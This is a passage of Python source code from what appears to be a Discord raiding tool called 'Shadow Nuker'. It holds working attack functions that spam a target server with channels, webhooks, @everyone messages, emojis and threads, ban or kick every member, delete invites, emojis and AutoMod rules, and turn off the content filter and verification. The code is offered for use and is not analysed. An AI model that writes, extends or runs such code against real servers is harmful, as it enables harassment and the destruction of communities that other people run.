            
        await asyncio.gather(*[wrap_task(c["id"]) for c in channels])
        
    print_results(stats)

async def attack_spam_channels(bot_client):
    global engine
    text_amount = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Text channels to create[/]", default=50)
    voice_amount = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Voice channels to create[/]", default=2)

    if text_amount + voice_amount > 500:
        print_warning("Discord limit is 500 channels. Clamping total to 500.")
        if text_amount > 500:
            text_amount = 500
            voice_amount = 0
        else:
            voice_amount = 500 - text_amount

    channel_name = await async_ask("[bold #d8b4fe]#[shadow.prompt] Channel base name[/]", default="shadow-net")

    stats = {"success": 0, "failed": 0}
    limit_reached = False

    async def create_channel(name, c_type):
        nonlocal limit_reached
        if limit_reached:
            stats["failed"] += 1
            return

        payload = {
            "name": name,
            "type": c_type
        }
        if c_type == 0:
            payload["topic"] = "Shadow Nuker was here"
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/channels", json=payload)
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            if isinstance(res, dict) and isinstance(res.get("details"), dict) and res["details"].get("code") == 30013:
                if not limit_reached:
                    print_warning("Maximum channel limit reached (500)! Stopping further creation.")
                limit_reached = True
            stats["failed"] += 1

    targets = []
    for i in range(1, text_amount + 1):
        targets.append((f"{channel_name}-{i}", 0))
    for i in range(1, voice_amount + 1):
        targets.append((f"{channel_name}-vc-{i}", 2))
        
    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating channels", total=len(targets))
        
        async def wrap_task(name, c_type):
            await create_channel(name, c_type)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(name, c_type) for name, c_type in targets])
        
    print_results(stats)

async def attack_spam_categories(bot_client):
    global engine
    category_amount = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Categories to create[/]", default=50)
    if category_amount > 500:
        print_warning("Discord limit is 500 categories/channels. Clamping to 500.")
        category_amount = 500

    category_name = await async_ask("[bold #d8b4fe]#[shadow.prompt] Category base name[/]", default="shadow-cat")

    stats = {"success": 0, "failed": 0}
    limit_reached = False

    async def create_category(name):
        nonlocal limit_reached
        if limit_reached:
            stats["failed"] += 1
            return

        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/channels", json={"name": name, "type": 4})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            if isinstance(res, dict) and isinstance(res.get("details"), dict) and res["details"].get("code") == 30013:
                if not limit_reached:
                    print_warning("Maximum channel limit reached (500)! Stopping further creation.")
                limit_reached = True
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating categories", total=category_amount)
        
        async def wrap_task(name):
            await create_category(name)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(f"{category_name}-{i}") for i in range(1, category_amount + 1)])
        
    print_results(stats)

async def attack_spam_messages(bot_client):
    global engine
    message = await async_ask("[bold #d8b4fe]#[shadow.prompt] Message to spam[/]")
    if not message.strip():
        print_error("Message cannot be empty.")
        return

    has_ping = "@everyone" in message or "@here" in message
    if not has_ping:
        ping_opt = await async_confirm("[bold #d8b4fe]#[shadow.prompt] Ping @everyone in spam messages?[/]", default=True)
        if ping_opt:
            message = f"@everyone {message}"
            has_ping = True

    if len(message) > 2000:
        message = message[:2000]
        print_warning("Message truncated to 2000 characters (Discord limit).")

    webhook_name = await async_ask("[bold #d8b4fe]#[shadow.prompt] Webhook display name (comma-separate for rotation)[/]", default="Shadow")
    webhook_name = webhook_name.strip()
    if not webhook_name:
        webhook_name = "Shadow"

    webhook_names = [n.strip() for n in webhook_name.split(',') if n.strip()]
    webhook_names = [n[:80] if len(n) > 80 else n for n in webhook_names]
    primary_name = webhook_names[0]

    spam_count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Messages per channel[/]", default=10)

    msg_payload = {"content": message}
    if has_ping:
        msg_payload["allowed_mentions"] = {"parse": ["everyone"]}

    print_info("Fetching channels...")
    channels = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/channels")
    if not isinstance(channels, list):
        print_error("Failed to fetch channels.")
        return

    text_channels = [c for c in channels if c.get("type") == 0]
    if not text_channels:
        print_warning("No text channels found.")
        return

    webhooks_per_channel = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Webhooks per channel (max 10)[/]", default=10)
    if webhooks_per_channel > 10:
        print_warning("Discord limit is 10 webhooks per channel. Clamping to 10.")
        webhooks_per_channel = 10
    elif webhooks_per_channel < 1:
        webhooks_per_channel = 1

    print_info("Fetching existing webhooks...")
    webhooks = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/webhooks")
    if not isinstance(webhooks, list):
        webhooks = []

    webhooks_by_channel = {c["id"]: [] for c in text_channels}
    for w in webhooks:
        c_id = w.get("channel_id")
        if c_id in webhooks_by_channel:
            webhooks_by_channel[c_id].append(w)

    stats = {"created": 0, "failed_webhooks": 0, "success": 0, "failed": 0}

    all_webhooks = list(webhooks)
    existing_usable = [w for w in all_webhooks if "token" in w]

    create_items = []
    for c in text_channels:
        existing = len(webhooks_by_channel[c["id"]])
        needed = webhooks_per_channel - existing
        for _ in range(max(0, needed)):
            create_items.append(c["id"])

    if not existing_usable and not create_items:
        print_error("No webhooks available and none can be created.")
        return

    estimated_spam = (len(existing_usable) + len(create_items)) * spam_count

    ready_queue = asyncio.Queue()
    for w in existing_usable:
        ready_queue.put_nowait(w)

    print_info(f"Pipeline: creating {len(create_items)} webhooks + spamming {estimated_spam} messages concurrently...")

    async def create_and_feed(channel_id):
        res = await engine.request("POST", f"/channels/{channel_id}/webhooks", json={"name": primary_name})
        if isinstance(res, dict) and "error" not in res and "token" in res:
            stats["created"] += 1
            await ready_queue.put(res)
        else:
            stats["failed_webhooks"] += 1

    async def spam_consumer(progress, spam_task):
        while True:
            w = await ready_queue.get()
            if w is None:
                ready_queue.task_done()
                break
            for _ in range(spam_count):
                payload = dict(msg_payload)
                payload["username"] = random.choice(webhook_names) if len(webhook_names) > 1 else primary_name
                res = await engine.request("POST", f"/webhooks/{w['id']}/{w['token']}", json=payload)
                if isinstance(res, dict) and "error" not in res:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
                progress.advance(spam_task)
            ready_queue.task_done()

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        create_task = progress.add_task("Creating webhooks", total=len(create_items) if create_items else 1)
        spam_task = progress.add_task("Spamming messages", total=estimated_spam)

        async def create_worker(cid):
            await create_and_feed(cid)
            progress.advance(create_task)

        # Spam consumers start immediately (drain existing webhooks first)
        num_consumers = min(75, max(1, estimated_spam))
        consumers = [asyncio.create_task(spam_consumer(progress, spam_task)) for _ in range(num_consumers)]

        # Creators run concurrently with consumers — different rate-limit buckets
        if create_items:
            creators = min(75, len(create_items))
            index = 0
            clock = asyncio.Lock()

            async def creator_loop():
                nonlocal index
                while True:
                    async with clock:
                        if index >= len(create_items):
                            return
                        cid = create_items[index]
                        index += 1
                    await create_worker(cid)

            await asyncio.gather(*[creator_loop() for _ in range(creators)])

        # Signal consumers to stop once all webhooks are processed
        for _ in range(num_consumers):
            await ready_queue.put(None)
        await asyncio.gather(*consumers)

        progress.update(create_task, completed=len(create_items) if create_items else 1)

    print_results(stats)
    console.print(f"[shadow.dim]Webhooks created: {stats['created']} | Failed: {stats['failed_webhooks']} | Messages sent: {stats['success']}[/]")

async def attack_kick_everyone(bot_client):
    global engine
    print_info("Fetching member list...")
    members_data = await fetch_all_members(engine, TARGET_SERVER_ID)
    
    targets = []
    bot_id = str(bot_client.user.id)
    
    if isinstance(members_data, list) and members_data:
        targets = [m for m in members_data if m["user"]["id"] != bot_id]
    else:
        print_warning("REST members fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            targets = [{"user": {"id": str(m.id)}} for m in server.members if m.id != bot_client.user.id]
            
    if not targets:
        print_warning("No other members to kick.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def kick_member(user_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/members/{user_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Kicking members", total=len(targets))
        
        async def wrap_task(u_id):
            await kick_member(u_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(m["user"]["id"]) for m in targets])
        
    print_results(stats)

async def attack_ban_everyone(bot_client):
    global engine
    print_info("Fetching member list...")
    members_data = await fetch_all_members(engine, TARGET_SERVER_ID)
    
    targets = []
    bot_id = str(bot_client.user.id)
    
    if isinstance(members_data, list) and members_data:
        targets = [m for m in members_data if m["user"]["id"] != bot_id]
    else:
        print_warning("REST members fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            targets = [{"user": {"id": str(m.id)}} for m in server.members if m.id != bot_client.user.id]
            
    if not targets:
        print_warning("No other members to ban.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def ban_member(user_id):
        res = await engine.request("PUT", f"/guilds/{TARGET_SERVER_ID}/bans/{user_id}", json={"delete_message_seconds": 0})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Banning members", total=len(targets))
        
        async def wrap_task(u_id):
            await ban_member(u_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(m["user"]["id"]) for m in targets])
        
    print_results(stats)

async def attack_unban_everyone(bot_client):
    global engine
    print_info("Fetching banned users list...")
    bans = []
    after = 0
    while True:
        path = f"/guilds/{TARGET_SERVER_ID}/bans?limit=1000"
        if after:
            path += f"&after={after}"
        batch = await engine.request("GET", path)
        if not isinstance(batch, list):
            if not bans:
                print_error("Failed to fetch ban list.")
                return
            break
        if not batch:
            break
        bans.extend(batch)
        after = batch[-1]["user"]["id"]
        if len(batch) < 1000:
            break
        
    if not bans:
        print_info("No banned users to unban.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def unban_user(user_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/bans/{user_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Unbanning users", total=len(bans))
        
        async def wrap_task(u_id):
            await unban_user(u_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(b["user"]["id"]) for b in bans])
        
    print_results(stats)

async def attack_server_name(bot_client):
    global engine
    new_name = await async_ask("[bold #d8b4fe]#[shadow.prompt] New server name[/]")
    if not new_name.strip():
        print_error("Name cannot be empty.")
        return
        
    stats = {"success": 0, "failed": 0}
    print_info(f"Changing server name to '{new_name}'...")
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}", json={"name": new_name})
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Server name updated!")
    else:
        stats["failed"] += 1
        print_error("Failed to change server name.")
    print_results(stats)

async def attack_server_picture(bot_client):
    global engine
    image_url = await async_ask("[bold #d8b4fe]#[shadow.prompt] Image URL or local file path[/]")
    if not image_url.strip():
        print_error("URL/Path cannot be empty.")
        return
        
    stats = {"success": 0, "failed": 0}
    print_info("Fetching/loading image and converting to base64...")
    data_uri = await fetch_image_data_uri(image_url)
    if not data_uri:
        print_error("Failed to load image. Verify the file path or URL.")
        return
        
    print_info("Updating guild icon...")
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}", json={"icon": data_uri})
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Guild icon updated!")
    else:
        stats["failed"] += 1
        print_error("Failed to update guild icon.")
    print_results(stats)

async def attack_delete_emojis(bot_client):
    global engine
    print_info("Fetching emojis...")
    emojis = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/emojis")
    
    if not isinstance(emojis, list):
        print_warning("REST emojis fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            emojis = [{"id": str(e.id)} for e in server.emojis]
        else:
            emojis = []
            
    if not emojis:
        print_info("No emojis to delete.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_emoji(emoji_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/emojis/{emoji_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting emojis", total=len(emojis))
        
        async def wrap_task(emoji_id):
            await delete_emoji(emoji_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(e["id"]) for e in emojis])
        
    print_results(stats)

async def attack_spam_emojis(bot_client):
    global engine
    image_urls_str = await async_ask("[bold #d8b4fe]#[shadow.prompt] Image URLs/Local paths (comma-separated)[/]")
    if not image_urls_str.strip():
        print_error("Image URLs/Paths cannot be empty.")
        return
        
    image_urls = [url.strip() for url in image_urls_str.split(',') if url.strip()]
    if not image_urls:
        print_error("No valid URLs/Paths provided.")
        return
        
    print_info("Loading images...")
    emoji_datas = []
    for url in image_urls:
        data_uri = await fetch_image_data_uri(url)
        if data_uri:
            base = re.split(r'[\\/]', url)[-1]
            name = base.split('?')[0].split('.')[0]
            name = re.sub(r'[^a-zA-Z0-9_]', '', name)
            if len(name) > 32:
                name = name[:32]
            if not name or len(name) < 2:
                name = "shadow"
            emoji_datas.append((name, data_uri))
            
    if not emoji_datas:
        print_error("No valid images could be loaded.")
        return
        
    stats = {"success": 0, "failed": 0}
    limit_reached = False

    async def create_emoji(name, data_uri):
        nonlocal limit_reached
        if limit_reached:
            stats["failed"] += 1
            return
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/emojis", json={"name": name, "image": data_uri})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            if isinstance(res, dict) and isinstance(res.get("details"), dict) and res["details"].get("code") == 30008:
                if not limit_reached:
                    print_warning("Maximum emoji limit reached! Stopping further creation.")
                limit_reached = True
            stats["failed"] += 1

    count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Number of each emoji to create[/]", default=50)

    targets = []
    for _ in range(count):
        for name, data_uri in emoji_datas:
            targets.append((name, data_uri))
            
    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating emojis", total=len(targets))
        
        async def wrap_task(name, data_uri):
            await create_emoji(name, data_uri)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(name, data_uri) for name, data_uri in targets])
        
    print_results(stats)

async def attack_delete_soundboard(bot_client):
    global engine
    print_info("Fetching soundboard sounds...")
    res = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/soundboard-sounds")
    
    sounds = []
    if isinstance(res, list):
        sounds = res
    elif isinstance(res, dict) and "items" in res:
        sounds = res["items"]
    else:
        print_error("Failed to fetch soundboard sounds.")
        return
        
    if not sounds:
        print_info("No soundboard sounds to delete.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_sound(sound_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/soundboard-sounds/{sound_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting sounds", total=len(sounds))
        
        async def wrap_task(sound_id):
            await delete_sound(sound_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(s["sound_id"]) for s in sounds])
        
    print_results(stats)

async def attack_spam_soundboard(bot_client):
    global engine
    count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Number of sounds to spam[/]", default=50)
    
    stats = {"success": 0, "failed": 0}
    
    async def create_sound(index):
        payload = {
            "name": f"Shadow Sound {index}",
            "sound": SILENT_MP3_URI,
            "volume": 1.0
        }
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/soundboard-sounds", json=payload)
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Spamming sounds", total=count)
        
        async def wrap_task(idx):
            await create_sound(idx)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(i) for i in range(1, count + 1)])
        
    print_results(stats)

async def attack_delete_invites(bot_client):
    global engine
    print_info("Fetching invites...")
    invites = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/invites")
    if not isinstance(invites, list):
        print_error("Failed to fetch invites.")
        return
        
    if not invites:
        print_info("No invites to delete.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_invite(code):
        res = await engine.request("DELETE", f"/invites/{code}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting invites", total=len(invites))
        
        async def wrap_task(code):
            await delete_invite(code)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(inv["code"]) for inv in invites])
        
    print_results(stats)

async def attack_spam_invites(bot_client):
    global engine
    count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Number of invites to create[/]", default=10)
    
    print_info("Fetching channels...")
    channels = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/channels")
    if not isinstance(channels, list):
        print_error("Failed to fetch channels.")
        return
        
    text_channels = [c for c in channels if c.get("type") == 0]
    if not text_channels:
        print_error("No text channels available to create invites on.")
        return
        
    target_channel_id = text_channels[0]["id"]
    
    stats = {"success": 0, "failed": 0}
    
    async def create_invite():
        res = await engine.request("POST", f"/channels/{target_channel_id}/invites", json={"max_age": 0, "max_uses": 0})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating invites", total=count)
        
        async def wrap_task():
            await create_invite()
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task() for _ in range(count)])
        
    print_results(stats)

async def attack_pause_invites(bot_client):
    global engine
    stats = {"success": 0, "failed": 0}
    print_info("Pausing server invites via incident-actions (24-hour lock)...")
    
    tomorrow = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=24)
    iso_timestamp = tomorrow.strftime("%Y-%m-%dT%H:%M:%SZ")
    
    payload = {
        "invites_disabled_until": iso_timestamp
    }
    
    res = await engine.request("PUT", f"/guilds/{TARGET_SERVER_ID}/incident-actions", json=payload)
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Invites paused successfully via incident-actions!")
        print_results(stats)
        return

    print_warning("incident-actions not available. Revoking all existing invites as backup...")
    invites = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/invites")
    if isinstance(invites, list):
        if invites:
            results = await asyncio.gather(*[engine.request("DELETE", f"/invites/{inv['code']}") for inv in invites])
            ok = [r for r in results if not (isinstance(r, dict) and "error" in r)]
            if ok:
                print_success(f"Revoked {len(ok)}/{len(results)} active invites!")
                stats["success"] += 1
            else:
                stats["failed"] += 1
                print_error("Failed to revoke any invites.")
        else:
            print_success("No active invites to revoke!")
            stats["success"] += 1
    else:
        stats["failed"] += 1
        print_error("Failed to pause invites.")

    print_results(stats)

async def attack_deactivate_automod(bot_client):
    global engine
    print_info("Fetching AutoMod rules...")
    rules = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/auto-moderation/rules")
    if not isinstance(rules, list):
        print_error("Failed to fetch AutoMod rules.")
        return
        
    if not rules:
        print_info("No AutoMod rules to deactivate.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_rule(rule_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/auto-moderation/rules/{rule_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting AutoMod rules", total=len(rules))
        
        async def wrap_task(rule_id):
            await delete_rule(rule_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(r["id"]) for r in rules])
        
    print_results(stats)

async def attack_deactivate_community(bot_client):
    global engine
    stats = {"success": 0, "failed": 0}
    print_info("Fetching guild features...")
    g_data = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}")
    if not isinstance(g_data, dict) or "features" not in g_data:
        print_error("Failed to fetch guild features.")
        return
        
    features = g_data["features"]
    features = [f for f in features if f not in ("COMMUNITY", "DISCOVERABLE", "FEATURABLE", "WELCOME_SCREEN_ENABLED")]
    
    print_info("Deactivating Community mode settings...")
    payload = {
        "features": features,
        "explicit_content_filter": 0,
        "verification_level": 0,
        "rules_channel_id": None,
        "public_updates_channel_id": None
    }
    
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}", json=payload)
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Community feature deactivated!")
    else:
        stats["failed"] += 1
        print_error(f"Failed to deactivate community. Details: {res}")
        
    print_results(stats)

async def attack_activate_community(bot_client):
    global engine
    stats = {"success": 0, "failed": 0}
    print_info("Preparing text channels for community requirements...")
    
    channels = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/channels")
    if not isinstance(channels, list):
        print_error("Failed to fetch channels.")
        return
        
    text_channels = [c for c in channels if c.get("type") == 0]
    
    rules_channel_id = None
    updates_channel_id = None
    
    for tc in text_channels:
        name = tc["name"].lower()
        if "rules" in name:
            rules_channel_id = tc["id"]
        elif "updates" in name or "moderator" in name:
            updates_channel_id = tc["id"]
            
    if not rules_channel_id:
        print_info("Creating #rules channel...")
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/channels", json={"name": "rules", "type": 0})
        if isinstance(res, dict) and "error" not in res:
            rules_channel_id = res["id"]
            
    if not updates_channel_id:
        print_info("Creating #moderator-updates channel...")
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/channels", json={"name": "moderator-updates", "type": 0})
        if isinstance(res, dict) and "error" not in res:
            updates_channel_id = res["id"]
            
    if not rules_channel_id or not updates_channel_id:
        print_error("Failed to prepare required channels for Community mode.")
        stats["failed"] += 1
        print_results(stats)
        return
        
    print_info("Fetching current guild features...")
    g_data = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}")
    if not isinstance(g_data, dict) or "features" not in g_data:
        print_error("Failed to fetch guild features.")
        return
        
    features = g_data["features"]
    if "COMMUNITY" not in features:
        features.append("COMMUNITY")
        
    payload = {
        "features": features,
        "verification_level": 1,
        "explicit_content_filter": 2,
        "rules_channel_id": rules_channel_id,
        "public_updates_channel_id": updates_channel_id
    }
    
    print_info("Attempting to activate Community mode...")
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}", json=payload)
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Community feature activated successfully!")
    else:
        stats["failed"] += 1
        print_error(f"Failed to activate community. Details: {res}")
        
    print_results(stats)

async def attack_thread_spam(bot_client):
    global engine
    all_channels = await async_confirm("[bold #d8b4fe]#[shadow.prompt] Create threads on ALL text channels?[/]", default=True)
    
    print_info("Fetching channels...")
    channels = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/channels")
    
    if not isinstance(channels, list):
        print_warning("REST channels fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            channels = [{"id": str(c.id), "type": 0 if isinstance(c, discord.TextChannel) else 2} for c in server.channels]
        else:
            channels = []
            
    text_channels = [c for c in channels if c.get("type") == 0]
    if not text_channels:
        print_error("No text channels available to create threads on.")
        return
        
    target_channels = []
    if all_channels:
        target_channels = text_channels
    else:
        ch_id_str = await async_ask("[bold #d8b4fe]#[shadow.prompt] Channel ID for threads[/]")
        ch = next((c for c in text_channels if c["id"] == ch_id_str), None)
        if ch:
            target_channels = [ch]
        else:
            print_error("Invalid Channel ID.")
            return
            
    thread_count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Threads per channel[/]", default=10)
    
    stats = {"success": 0, "failed": 0}
    
    async def create_thread(item):
        channel_id, index = item
        msg_res = await engine.request("POST", f"/channels/{channel_id}/messages", json={"content": f"Shadow Thread {index}"})
        if not (isinstance(msg_res, dict) and "id" in msg_res and "error" not in msg_res):
            stats["failed"] += 1
            return
        msg_id = msg_res["id"]
        res = await engine.request("POST", f"/channels/{channel_id}/messages/{msg_id}/threads", json={"name": f"P H A N T O M - {index}", "auto_archive_duration": 60})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    targets = []
    for tc in target_channels:
        for i in range(1, thread_count + 1):
            targets.append((tc["id"], i))
            
    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
